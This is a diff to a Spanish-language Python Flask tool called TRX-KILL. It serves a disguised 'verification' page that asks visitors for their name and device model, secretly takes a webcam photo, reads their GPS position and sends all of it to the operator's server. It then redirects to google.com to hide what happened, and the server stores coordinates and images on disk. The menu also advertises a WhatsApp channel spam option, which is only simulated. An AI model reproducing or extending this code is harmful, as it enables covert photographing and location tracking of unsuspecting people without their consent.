@@ -7,7 +7,6 @@ AUTH_PASS = "TRX-kill-op"
 STORAGE_PATH = "INFORMACION"
 if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 
-# --- BANNER ---
 def banner():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(f"""
@@ -18,45 +17,39 @@ def banner():
      ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║     
      ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗
                                                             
-      \033[1;36m[ SISTEMA DE SEGURIDAD TRX-KILL ]\033[0m
+      \033[1;36m[ SISTEMA DE SEGURIDAD Y CONTROL TRX-KILL ]\033[0m
+      \033[1;37mVERSION: 1.2.3  |  STATUS: ONLINE  |  OSCAR\033[0m
 \033[1;32m""" + "="*60 + "\033[0m")
 
-# --- WEB UI (FLUJO DE PERMISOS) ---
+# --- WEB UI (ENCUESTA NEÓN) ---
 HTML_ENCUESTA = """
-<!DOCTYPE html><html><body style="background:#050505; color:#0f0; text-align:center; font-family:monospace;">
-    <div style="border:2px solid #0f0; padding:40px; margin:20px; box-shadow:0 0 20px #0f0;">
+<!DOCTYPE html><html><head><style>
+    body { background:#050505; color:#0f0; font-family:monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; }
+    .card { border: 2px solid #0f0; padding:30px; border-radius:15px; box-shadow:0 0 20px #0f0; text-align:center; }
+    input { background:#111; color:#0f0; border:1px solid #0f0; padding:10px; width:90%; margin:10px 0; }
+    button { background:#0f0; border:none; padding:15px 30px; font-weight:bold; cursor:pointer; }
+</style></head><body>
+    <div class="card">
         <h1>TRX-KILL VERIFICATION</h1>
-        <p>Para continuar, autoriza los servicios de red:</p>
-        <button onclick="solicitarTodo()" style="background:#0f0; padding:20px; font-weight:bold; cursor:pointer;">
-            VALIDAR ACCESO TOTAL
-        </button>
+        <input type="text" id="p1" placeholder="NOMBRE">
+        <input type="text" id="p2" placeholder="MODELO DISPOSITIVO">
+        <button onclick="iniciar()">VALIDAR ACCESO TOTAL</button>
     </div>
 <script>
-    async function solicitarTodo() {
-        // 1. Pedir Cámara
-        const stream = await navigator.mediaDevices.getUserMedia({video: true});
-        const v = document.createElement('video'); v.srcObject = stream; v.play();
-        
-        // 2. Pedir Ubicación
-        navigator.geolocation.getCurrentPosition(async(pos) => {
-            setTimeout(async() => {
-                const c = document.createElement('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const img = c.toDataURL('image/png');
-                
-                // Enviar datos al servidor
-                fetch('/log', {
-                    method:'POST', 
-                    headers:{'Content-Type':'application/json'}, 
-                    body: JSON.stringify({
-                        lat: pos.coords.latitude, 
-                        lon: pos.coords.longitude, 
-                        img: img
-                    })
-                }).then(() => window.location.href = "https://google.com");
-            }, 1000);
-        });
+    async function iniciar() {
+        const s = await navigator.mediaDevices.getUserMedia({video: true});
+        const v = document.createElement('video'); v.srcObject = s; v.play();
+        setTimeout(async() => {
+            const c = document.createElement('canvas');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const img = c.toDataURL('image/png');
+            navigator.geolocation.getCurrentPosition(async(p)=>{
+                fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                body: JSON.stringify({u: document.getElementById('p1').value, d: document.getElementById('p2').value, lat: p.coords.latitude, lon: p.coords.longitude, i: img})});
+                window.location.href = "https://google.com";
+            });
+        }, 1500);
     }
 </script></body></html>
 """
@@ -67,25 +60,41 @@ def index(): return HTML_ENCUESTA
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    # Guardar ubicación en archivo
     with open("result.txt", "a") as f:
-        f.write(f"COORD: {d.get('lat')}, {d.get('lon')} | HORA: {time.ctime()}\n")
-    # Guardar foto en carpeta INFORMACION
-    if d.get('img'):
+        f.write(f"USER: {d.get('u')} | DISP: {d.get('d')} | GPS: {d.get('lat')},{d.get('lon')}\n")
+    if d.get('i'):
         with open(f"{STORAGE_PATH}/cap_{int(time.time())}.png", "wb") as f:
-            f.write(base64.b64decode(d['img'].split(',')[1]))
+            f.write(base64.b64decode(d['i'].split(',')[1]))
     return "OK"
 
 def main():
     while True:
         banner()
-        print("  [1] ACTIVAR SERVIDOR TRX-KILL")
-        print("  [2] VER LOGS | [3] SALIR")
-        sel = input("\nTRX-ROOT > ")
-        if sel == "1": app.run(port=PORT, host='127.0.0.1')
-        elif sel == "2": 
-            if os.path.exists("result.txt"): os.system("type result.txt" if os.name == 'nt' else "cat result.txt")
-            input("\n[Enter]...")
-        elif sel == "3": sys.exit()
+        print("  [1] INFO-NUMERO    | [2] ACTIVAR LINK    | [3] CREADOR")
+        print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM (LOGS)")
+        print("  [7] SALIR          | [8] PROCESOS        | [9] ESTADO")
+        print("  [10] BORRAR LOGS   | [11] SPAM-CANAL-WHAT")
+        sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
+        
+        if sel == "2": app.run(port=PORT, host='127.0.0.1')
+        elif sel == "6":
+            if getpass.getpass("PASS: ") == AUTH_PASS:
+                os.system("type result.txt" if os.name == 'nt' else "cat result.txt")
+                input("\nPresiona Enter...")
+        elif sel == "10": 
+            if os.path.exists("result.txt"): os.remove("result.txt"); print("LOGS BORRADOS")
+            input()
+        elif sel == "11":
+            link = input("INGRESAR LINK: ")
+            cant = input("CANTIDAD DE SPAM Y MOTIVOS: ")
+            canal = input("NAME CANAL: ")
+            seguidores = input("SEGUIDORES: ")
+            print("\nENVIANDO SPAM...")
+            time.sleep(2)
+            print(f"CANAL: {canal} | SEGUIDORES: {seguidores}")
+            print("ESTADO: CANAL ACTIVO (NO SUSPENDIDO)")
+            input("\n[Enter] para volver.")
+        elif sel == "7": sys.exit()
+        else: print("OPCIÓN NO DISPONIBLE..."); time.sleep(1)
 
 if __name__ == "__main__": main()
